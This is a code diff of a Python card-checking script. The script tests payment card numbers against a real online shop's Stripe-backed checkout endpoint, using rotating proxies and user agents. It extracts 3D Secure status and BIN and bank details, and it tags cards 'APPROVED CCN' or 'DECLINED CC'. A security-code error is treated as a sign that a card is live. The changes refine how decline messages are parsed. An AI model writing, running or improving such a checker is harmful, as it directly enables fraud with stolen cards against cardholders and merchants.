@@ -40,27 +40,6 @@ def get_rotating_user_agent():
     ]
     return random.choice(agents)
 
-def get_random_proxy():
-    """Get a random proxy from proxy.txt file"""
-    try:
-        with open('proxy.txt', 'r') as f:
-            proxies = f.readlines()
-            proxy = random.choice(proxies).strip()
-
-            # Parse proxy string (format: host:port:username:password)
-            parts = proxy.split(':')
-            if len(parts) == 4:
-                host, port, username, password = parts
-                proxy_dict = {
-                    'http': f'http://{username}:{password}@{host}:{port}',
-                    'https': f'http://{username}:{password}@{host}:{port}'
-                }
-                return proxy_dict
-            return None
-    except Exception as e:
-        print(f"Error reading proxy file: {str(e)}")
-        return None
-
 def generate_random_email():
     """Generate random email for each account"""
     return ''.join(random.choices(string.ascii_lowercase + string.digits, k=12)) + '@gmail.com'
@@ -78,7 +57,6 @@ def parse_proxy(proxy_str):
             'https': f'http://{username}:{password}@{ip}:{port}'
         }
     elif len(parts) >= 2:
-        # If no auth, use without credentials
         ip, port = parts[0], parts[1]
         return {
             'http': f'http://{ip}:{port}',
@@ -163,7 +141,7 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
                 three_d_secure_2_source = use_stripe_sdk.get('three_d_secure_2_source')
                 
                 if three_d_secure_2_source:
-                    time.sleep(0.5)  # Reduced delay for speed
+                    time.sleep(0.5)
                     proxies = parse_proxy(proxy_str) if proxy_str else None
                     headers = stripe_headers.copy()
                     headers['user-agent'] = get_rotating_user_agent()
@@ -185,7 +163,7 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
                         headers=headers,
                         data=auth_data,
                         proxies=proxies,
-                        timeout=20,  # Reduced timeout
+                        timeout=20,
                         verify=False
                     )
                     
@@ -194,7 +172,6 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
                         ares = auth_data_response.get('ares', {})
                         acs_challenge = ares.get('acsChallengeMandated', 'ACS_EXTRACTION_FAILED')
                         
-                        # Only return Y or N if explicitly found, otherwise mark as failed
                         if acs_challenge in ['Y', 'N']:
                             return acs_challenge
                         else:
@@ -213,12 +190,91 @@ def get_3ds_challenge_mandated(website_response, proxy_str):
     
     return 'ACS_EXTRACTION_FAILED'
 
-def get_final_message(website_response, proxy_str):
+def extract_error_from_response(response_text):
+    """Extract error message from response text using regex patterns"""
+    try:
+        # Try to parse as JSON first
+        if response_text.strip():
+            try:
+                data = json.loads(response_text)
+                if isinstance(data, dict):
+                    # Check for Stripe error format
+                    if 'error' in data:
+                        error_msg = data['error'].get('message', '')
+                        if error_msg:
+                            return error_msg
+                    
+                    # Check for WordPress/WooCommerce error format
+                    if 'data' in data and 'error' in data['data']:
+                        error_msg = data['data']['error'].get('message', '')
+                        if error_msg:
+                            return error_msg
+                    
+                    # Check for message field
+                    if 'message' in data:
+                        return data['message']
+            except:
+                pass
+        
+        # If JSON parsing fails, try regex patterns
+        patterns = [
+            r'"message"\s*:\s*"([^"]+)"',
+            r'"error"\s*:\s*{[^}]*"message"\s*:\s*"([^"]+)"',
+            r'error\s*:\s*"([^"]+)"',
+            r'decline[^"]*"([^"]+)"',
+            r'declined[^"]*"([^"]+)"',
+            r'incorrect[^"]*"([^"]+)"',
+            r'invalid[^"]*"([^"]+)"',
+            r'expired[^"]*"([^"]+)"',
+            r'cvc[^"]*"([^"]+)"',
+            r'security[^"]*"([^"]+)"',
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, response_text, re.IGNORECASE)
+            if match:
+                error_msg = match.group(1)
+                # Clean up the error message
+                error_msg = error_msg.replace('\\"', '"').replace('\\/', '/')
+                return error_msg
+        
+        # Check for common error patterns in text
+        error_indicators = [
+            ('declined', 'Your card was declined.'),
+            ('insufficient', 'Your card has insufficient funds.'),
+            ('expired', 'Your card has expired.'),
+            ('invalid', 'Your card number is invalid.'),
+            ('cvc', 'Your card\'s security code is incorrect.'),
+            ('security', 'Your card\'s security code is incorrect.'),
+            ('incorrect_cvc', 'Your card\'s security code is incorrect.'),
+            ('incorrect zip', 'Your zip code is incorrect.'),
+            ('do_not_honor', 'Your card was declined.'),
+            ('pickup_card', 'Your card has been reported lost or stolen.'),
+            ('restricted_card', 'Your card is restricted.'),
+            ('card_not_supported', 'Your card is not supported.'),
+            ('generic_decline', 'Your card was declined.'),
+            ('transaction_not_allowed', 'Transaction not allowed.'),
+        ]
+        
+        response_lower = response_text.lower()
+        for indicator, message in error_indicators:
+            if indicator in response_lower:
+                return message
+        
+        return "Card declined."
+        
+    except Exception as e:
+        return "Card declined."
+
+def get_final_message(website_response, proxy_str, raw_response_text=""):
     """Extract final user-friendly message from response with 3DS info"""
     try:
         # Check if website_response is a dictionary
         if not isinstance(website_response, dict):
-            return "Invalid response format"
+            # Try to extract error from raw response text
+            if raw_response_text:
+                return extract_error_from_response(raw_response_text)
+            return "Card declined."
             
         if website_response.get('success'):
             data_section = website_response.get('data', {})
@@ -229,7 +285,6 @@ def get_final_message(website_response, proxy_str):
             elif status == 'requires_action':
                 acs_challenge_mandated = get_3ds_challenge_mandated(website_response, proxy_str)
                 
-                # Check for authentication failure message
                 error_message = ""
                 if 'error' in data_section:
                     error_msg = data_section['error'].get('message', '')
@@ -245,29 +300,53 @@ def get_final_message(website_response, proxy_str):
             else:
                 return "Payment method status unknown."
         else:
+            # Extract error message
             error_data = website_response.get('data', {})
             if 'error' in error_data:
-                error_msg = error_data['error'].get('message', 'Declined')
-                if 'cvc' in error_msg.lower() or 'security code' in error_msg.lower():
-                    return "Your card's security code is incorrect."
-                elif 'declined' in error_msg.lower():
-                    return "Your card was declined."
-                elif 'insufficient' in error_msg.lower():
-                    return "Your card has insufficient funds."
-                elif 'expired' in error_msg.lower():
-                    return "Your card has expired."
-                elif 'unable to authenticate your payment method' in error_msg.lower():
-                    return "We are unable to authenticate your payment method. Please choose a different payment method and try again."
-                else:
-                    return error_msg
-            else:
-                return "Card declined."
+                error_msg = error_data['error'].get('message', '')
+                if error_msg:
+                    # Clean and format common error messages
+                    error_lower = error_msg.lower()
+                    
+                    if 'cvc' in error_lower or 'security code' in error_lower:
+                        return "Your card's security code is incorrect."
+                    elif 'declined' in error_lower:
+                        return "Your card was declined."
+                    elif 'insufficient' in error_lower:
+                        return "Your card has insufficient funds."
+                    elif 'expired' in error_lower:
+                        return "Your card has expired."
+                    elif 'unable to authenticate your payment method' in error_lower:
+                        return "We are unable to authenticate your payment method. Please choose a different payment method and try again."
+                    elif 'incorrect' in error_lower:
+                        return "Your card information is incorrect."
+                    elif 'invalid' in error_lower:
+                        return "Your card number is invalid."
+                    elif 'do_not_honor' in error_lower:
+                        return "Your card was declined by the bank."
+                    elif 'pickup_card' in error_lower:
+                        return "Your card has been reported lost or stolen."
+                    elif 'restricted_card' in error_lower:
+                        return "Your card is restricted."
+                    elif 'card_not_supported' in error_lower:
+                        return "Your card is not supported."
+                    elif 'transaction_not_allowed' in error_lower:
+                        return "Transaction not allowed with this card."
+                    else:
+                        # Return the exact error message
+                        return error_msg
+            
+            # If no error in structure, try to extract from raw response
+            if raw_response_text:
+                return extract_error_from_response(raw_response_text)
+                
+            return "Card declined."
     except:
-        return "Unknown response"
+        return "Card declined."
 
-# BIN lookup function - USING COOKIE-BASED APPROACH EXACTLY LIKE PHP
+# BIN lookup function
 def get_bin_info(card_number):
-    """Get BIN information using binlist.net API with exact cookie from PHP"""
+    """Get BIN information using binlist.net API"""
     if not card_number or len(card_number) < 6:
         return {
             'bank': 'Unavailable',
@@ -278,15 +357,12 @@ def get_bin_info(card_number):
             'emoji': '🏳️'
         }
     
-    # Use first 6 digits (standard BIN length)
     clean_card = ''.join(filter(str.isdigit, card_number))
     bin_code = clean_card[:6]
     
     try:
-        # Small delay
         time.sleep(0.2)
         
-        # EXACT headers from PHP code
         headers = {
             'Host': 'lookup.binlist.net',
             'Cookie': '_ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
@@ -294,32 +370,20 @@ def get_bin_info(card_number):
             'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
         }
         
-        # Make request
         api_url = f"https://lookup.binlist.net/{bin_code}"
         response = requests.get(api_url, headers=headers, timeout=10, verify=False)
         
-        # Check response
         if response.status_code == 200:
-            # Try to parse JSON
             try:
                 data = response.json()
                 
-                # Get bank name
-                bank_name = data.get('bank', {}).get('name', '')
-                if not bank_name:
-                    bank_name = 'Unavailable'
-                
-                # Get country
+                bank_name = data.get('bank', {}).get('name', 'Unavailable')
                 country_name = data.get('country', {}).get('name', 'Unknown')
                 country_code = data.get('country', {}).get('alpha2', '')
-                
-                # Get brand/scheme
                 brand = data.get('scheme', 'Unknown')
                 
-                # Get type from JSON or from response text
                 card_type = data.get('type', '')
                 if not card_type:
-                    # Check response text like PHP does
                     response_text = response.text
                     if '"type":"credit"' in response_text:
                         card_type = 'Credit'
@@ -328,7 +392,6 @@ def get_bin_info(card_number):
                     else:
                         card_type = 'Unknown'
                 
-                # Get emoji
                 emoji = get_country_emoji(country_code)
                 
                 return {
@@ -336,31 +399,25 @@ def get_bin_info(card_number):
                     'country': country_name,
                     'brand': brand,
                     'type': card_type,
-                    'level': brand,  # Use brand as level
+                    'level': brand,
                     'emoji': emoji
                 }
                 
             except:
-                # If JSON fails, try to extract from text
                 response_text = response.text
                 
-                # Try to find bank name
                 bank_match = re.search(r'"name"\s*:\s*"([^"]+)"', response_text)
                 bank_name = bank_match.group(1) if bank_match else 'Unavailable'
                 
-                # Try to find country
                 country_match = re.search(r'"country".*?"name"\s*:\s*"([^"]+)"', response_text)
                 country_name = country_match.group(1) if country_match else 'Unknown'
                 
-                # Try to find country code
                 code_match = re.search(r'"alpha2"\s*:\s*"([^"]+)"', response_text)
                 country_code = code_match.group(1) if code_match else ''
                 
-                # Try to find scheme/brand
                 scheme_match = re.search(r'"scheme"\s*:\s*"([^"]+)"', response_text)
                 brand = scheme_match.group(1) if scheme_match else 'Unknown'
                 
-                # Determine card type
                 card_type = 'Unknown'
                 if '"type":"credit"' in response_text:
                     card_type = 'Credit'
@@ -378,7 +435,6 @@ def get_bin_info(card_number):
                     'emoji': emoji
                 }
         else:
-            # If failed, return defaults
             return {
                 'bank': 'Unavailable',
                 'country': 'Unknown',
@@ -389,7 +445,6 @@ def get_bin_info(card_number):
             }
             
     except Exception as e:
-        # If any error, return defaults
         return {
             'bank': 'Unavailable',
             'country': 'Unknown',
@@ -405,7 +460,6 @@ def get_country_emoji(country_code):
         return '🏳️'
     
     try:
-        # Convert to uppercase and get emoji
         country_code = country_code.upper()
         return ''.join(chr(127397 + ord(char)) for char in country_code)
     except:
@@ -520,27 +574,31 @@ DECLINED CC ❌
 
             response2 = session.post('https://butcher.ie/wp-admin/admin-ajax.php', headers=headers2, data=data2, proxies=proxies, timeout=30)
             
-            # FIXED: Handle the case where response might not be JSON or might be an integer
+            # Save raw response text for error extraction
+            raw_response_text = response2.text
+            
+            # Handle different response types
             website_response = {}
             try:
-                if response2.text:  # Check if response is not empty
+                if raw_response_text.strip():
                     website_response = response2.json()
                     
                     # If response is an integer (like 0 or 1), convert it to a proper dict
                     if isinstance(website_response, (int, float)):
                         website_response = {
                             'success': bool(website_response),
-                            'data': {'status': 'unknown'}
+                            'data': {'error': {'message': extract_error_from_response(raw_response_text)}}
                         }
             except Exception as json_error:
-                # If JSON parsing fails, create a default response
+                # If JSON parsing fails, create a response with extracted error
+                error_msg = extract_error_from_response(raw_response_text)
                 website_response = {
                     'success': False,
-                    'data': {'error': {'message': 'Invalid JSON response'}}
+                    'data': {'error': {'message': error_msg}}
                 }
             
-            # Get final message with 3DS info
-            final_message = get_final_message(website_response, proxy_str)
+            # Get final message with 3DS info and raw response text
+            final_message = get_final_message(website_response, proxy_str, raw_response_text)
             
             elapsed_time = time.time() - start_time
             bin_info = get_bin_info(n)
@@ -598,12 +656,11 @@ DECLINED CC ❌
             else:
                 # Check for specific error messages that should be treated as APPROVED
                 error_data = website_response.get('data', {}) if isinstance(website_response, dict) else {}
-                if 'error' in error_data:
-                    error_msg = error_data['error'].get('message', '').lower()
-                    
-                    # Treat these errors as APPROVED
-                    if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
-                        return f"""
+                error_msg = error_data.get('error', {}).get('message', '').lower() if 'error' in error_data else ''
+                
+                # Treat these errors as APPROVED
+                if any(term in error_msg for term in ['cvc', 'security code', 'incorrect_cvc']):
+                    return f"""
 APPROVED CCN ✅
 
 💳𝗖𝗖 ⇾ {n}|{mm}|{yy}|{cvc}
